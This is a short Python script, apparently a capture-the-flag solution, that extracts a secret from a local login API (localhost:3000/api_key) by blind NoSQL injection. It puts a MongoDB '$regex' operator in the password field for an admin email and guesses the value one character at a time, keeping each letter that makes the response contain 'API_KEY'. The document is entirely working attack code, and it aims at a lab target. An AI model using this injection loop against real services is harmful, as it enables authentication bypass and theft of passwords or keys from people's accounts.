import requests

flag_letters = 'abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVXWYZ0123456789_-{}'
index = 0
flag = "FLAG-"
url = "http://localhost:3000/api_key"
headers = {'Content-type': 'application/json'}
while True:
    for letter in flag_letters:
        data = {"email": "admin@unite.com", "password": {"$regex": "{}(.*)".format(flag + letter)}}
        response = requests.post(url, json=data, headers=headers)
        index = index + 1
        if "API_KEY" in response.text:
            flag = flag + letter
            print(flag)